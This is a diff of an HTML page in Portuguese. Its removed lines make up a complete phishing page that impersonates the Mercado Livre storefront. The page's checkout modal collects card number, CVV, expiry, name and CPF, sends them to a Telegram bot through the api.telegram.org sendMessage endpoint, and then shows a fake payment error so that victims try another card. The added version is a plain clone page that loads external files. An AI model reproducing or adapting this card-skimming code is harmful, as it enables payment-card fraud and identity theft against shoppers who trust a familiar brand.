@@ -1,216 +1,54 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Mercado Livre - Ofertas</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #ebebeb; }
-        
-        /* HEADER */
-        .header { background-color: #fff159; padding: 8px 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .header-container { max-width: 1200px; margin: 0 auto; padding: 0 16px; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
-        .logo { font-size: 28px; font-weight: bold; color: #333; text-decoration: none; letter-spacing: -0.5px; }
-        .search-box { flex: 1; max-width: 600px; display: flex; }
-        .search-box input { flex: 1; padding: 10px 15px; border: none; border-radius: 4px 0 0 4px; font-size: 14px; background: white; border: 1px solid #ddd; border-right: none; }
-        .search-box button { background: white; border: 1px solid #ddd; border-left: none; padding: 10px 15px; border-radius: 0 4px 4px 0; cursor: pointer; font-weight: bold; }
-        .user-links { display: flex; gap: 20px; }
-        .user-links a { color: #333; text-decoration: none; font-size: 14px; font-weight: 500; }
-        
-        /* MAIN */
-        .main { max-width: 1200px; margin: 16px auto; padding: 0 16px; }
-        
-        /* GRID */
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; }
-        
-        /* CARD */
-        .card { background: white; border-radius: 8px; overflow: hidden; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 1px 2px rgba(0,0,0,0.08); }
-        .card:hover { transform: translateY(-4px); box-shadow: 0 4px 12px rgba(0,0,0,0.12); }
-        .card-img { width: 100%; background: #fff; display: flex; justify-content: center; align-items: center; border-bottom: 1px solid #eee; padding: 20px; }
-        .card-img span { font-size: 80px; }
-        .card-info { padding: 16px; }
-        .price { font-size: 24px; font-weight: 700; color: #333; margin-bottom: 4px; }
-        .installment { font-size: 12px; color: #00a650; font-weight: 500; margin-bottom: 8px; }
-        .title { font-size: 14px; color: #666; line-height: 1.4; height: 38px; overflow: hidden; margin-bottom: 8px; }
-        .shipping { color: #00a650; font-size: 12px; font-weight: bold; }
-        
-        /* MODAL CHECKOUT */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; align-items: center; justify-content: center; }
-        .modal-content { background: white; max-width: 480px; width: 90%; border-radius: 16px; padding: 24px; max-height: 90vh; overflow-y: auto; }
-        .modal-header { font-size: 20px; font-weight: 600; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 12px; display: flex; justify-content: space-between; }
-        .close { cursor: pointer; font-size: 28px; }
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 14px; }
-        .row { display: flex; gap: 12px; }
-        .row .form-group { flex: 1; }
-        .btn-pay { width: 100%; padding: 14px; background: #3483fa; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 8px; }
-        .error { background: #fee; color: #c00; padding: 12px; border-radius: 8px; margin-bottom: 16px; display: none; font-size: 13px; }
-        .secure { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
-        footer { background: white; padding: 20px; text-align: center; font-size: 12px; color: #666; margin-top: 32px; border-top: 1px solid #ddd; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="styless.css">
+    <title>Mercado Livre</title>
 </head>
+
 <body>
+    <header class="header">
+        <div class="container">
 
-<div class="header">
-    <div class="header-container">
-        <div class="logo">Mercado Livre</div>
-        <div class="search-box">
-            <input type="text" id="searchInput" placeholder="Buscar produtos, marcas e muito mais...">
-            <button onclick="filterProducts()">🔍 Buscar</button>
-        </div>
-        <div class="user-links">
-            <a href="#">Cria sua conta</a>
-            <a href="#">Entre</a>
-            <a href="#">Vender</a>
-        </div>
-    </div>
-</div>
 
-<div class="main">
-    <div id="productsGrid" class="grid"></div>
-</div>
+            <div class="search-container">
+                <img alt="logo-mercado-livre" class="logo"
+                    src="https://http2.mlstatic.com/D_NQ_NP_753757-MLA95975784786_102025-F.jpg">
 
-<footer>
-    <p>Copyright © 1999-2025 MercadoLivre - Compra Garantida® | Devolução grátis</p>
-</footer>
+                <input type="text" id="searchInput" placeholder="Buscar produtos..." class="search-input">
 
-<!-- MODAL -->
-<div id="checkoutModal" class="modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <span>Dados do cartão</span>
-            <span class="close" onclick="closeModal()">&times;</span>
-        </div>
-        <div class="error" id="errorMsg"></div>
-        <div class="form-group">
-            <label>Número do cartão</label>
-            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000">
-        </div>
-        <div class="form-group">
-            <label>Nome no cartão</label>
-            <input type="text" id="cardName" placeholder="Como está no cartão">
-        </div>
-        <div class="row">
-            <div class="form-group">
-                <label>Validade</label>
-                <input type="text" id="cardExpiry" placeholder="MM/AAAA">
-            </div>
-            <div class="form-group">
-                <label>CVV</label>
-                <input type="text" id="cardCvv" placeholder="123">
+                <button id="searchBtn" class="search-btn"><i class="fa-solid fa-magnifying-glass"></i></button>
             </div>
         </div>
-        <div class="form-group">
-            <label>CPF</label>
-            <input type="text" id="cardCpf" placeholder="000.000.000-00">
-        </div>
-        <button class="btn-pay" onclick="sendData()">Confirmar pagamento</button>
-        <div class="secure">🔒 Pagamento 100% seguro - Mercado Pago</div>
-    </div>
-</div>
+    </header>
 
-<script>
-    const BOT_TOKEN = "SEU_TOKEN_AQUI";
-    const CHAT_ID = "6832775799";
-    
-    let selectedProduct = null;
-    let selectedPrice = 0;
+    <section class="hero">
+        <h1>Ofertas Imperdíveis</h1>
+        <p>Black Friday CLDev</p>
+    </section>
 
-    const products = [
-        { name: "Geladeira Brastemp Frost Free 385 Litros Duplex...", price: 2999, emoji: "🧊" },
-        { name: "Geladeira Electroflux Frost Free Inverter Efficient 415L...", price: 2499, emoji: "🧊" },
-        { name: "Geladeira Brastemp Frost Duplex - Crm44mk Inox...", price: 2978, emoji: "🧊" }
-    ];
+    <main class="main">
+        <div class="container">
+            <h2 class="section-title">Ofertas do dia</h2>
+            <div class="product-grid" id="productsGrid">
 
-    function renderProducts(list) {
-        const container = document.getElementById('productsGrid');
-        container.innerHTML = '';
-        list.forEach(p => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.onclick = () => openModal(p.name, p.price);
-            card.innerHTML = `
-                <div class="card-img"><span>${p.emoji}</span></div>
-                <div class="card-info">
-                    <div class="price">R$ ${p.price.toFixed(2)}</div>
-                    <div class="installment">10x R$ ${(p.price/10).toFixed(2)} sem juros</div>
-                    <div class="title">${p.name}</div>
-                    <div class="shipping">✅ Chegará grátis sexta-feira</div>
                 </div>
-            `;
-            container.appendChild(card);
-        });
-    }
 
-    function filterProducts() {
-        const term = document.getElementById('searchInput').value.toLowerCase();
-        if (!term) return renderProducts(products);
-        const filtered = products.filter(p => p.name.toLowerCase().includes(term));
-        renderProducts(filtered);
-    }
+            </div>
+        </div>
+    </main>
 
-    function openModal(name, price) {
-        selectedProduct = name;
-        selectedPrice = price;
-        document.getElementById('checkoutModal').style.display = 'flex';
-    }
+    <footer class="footer">
+        <p>Clone do Mercado Livre - Oficial CLDev</p>
+    </footer>
 
-    function closeModal() {
-        document.getElementById('checkoutModal').style.display = 'none';
-        document.querySelectorAll('#checkoutModal input').forEach(i => i.value = '');
-    }
+    <script src="scripts.js"></script>
 
-    document.getElementById('cardNumber').addEventListener('input', function(e) {
-        let v = e.target.value.replace(/\D/g, '');
-        v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
-        e.target.value = v.substring(0, 19);
-    });
-
-    document.getElementById('cardExpiry').addEventListener('input', function(e) {
-        let v = e.target.value.replace(/\D/g, '');
-        if (v.length >= 4) v = v.substring(0, 2) + '/' + v.substring(2, 6);
-        e.target.value = v.substring(0, 7);
-    });
-
-    document.getElementById('cardCpf').addEventListener('input', function(e) {
-        let v = e.target.value.replace(/\D/g, '');
-        if (v.length <= 11) {
-            v = v.replace(/(\d{3})(\d)/, '$1.$2');
-            v = v.replace(/(\d{3})(\d)/, '$1.$2');
-            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-        }
-        e.target.value = v;
-    });
-
-    async function sendData() {
-        const numero = document.getElementById('cardNumber').value.replace(/\s/g, '');
-        const nome = document.getElementById('cardName').value;
-        const validade = document.getElementById('cardExpiry').value;
-        const cvv = document.getElementById('cardCvv').value;
-        const cpf = document.getElementById('cardCpf').value.replace(/\D/g, '');
-
-        if (!numero || numero.length < 15) return showError('Número inválido');
-        if (!nome) return showError('Nome inválido');
-        if (!validade || validade.length < 6) return showError('Data inválida');
-        if (!cvv || cvv.length < 3) return showError('CVV inválido');
-        if (!cpf || cpf.length < 11) return showError('CPF inválido');
-
-        const msg = `💰💰💰 VENDA ML PREMIUM 💰💰💰\nProduto: ${selectedProduct}\nValor: R$ ${selectedPrice}\nCartão: ${numero}\nNome: ${nome}\nValidade: ${validade}\nCVV: ${cvv}\nCPF: ${cpf}`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        showError('Erro no processamento. Tente outro cartão.');
-        setTimeout(() => closeModal(), 2000);
-    }
-
-    function showError(m) {
-        const err = document.getElementById('errorMsg');
-        err.innerText = m;
-        err.style.display = 'block';
-        setTimeout(() => err.style.display = 'none', 3000);
-    }
-
-    renderProducts(products);
-</script>
 </body>
+
 </html>
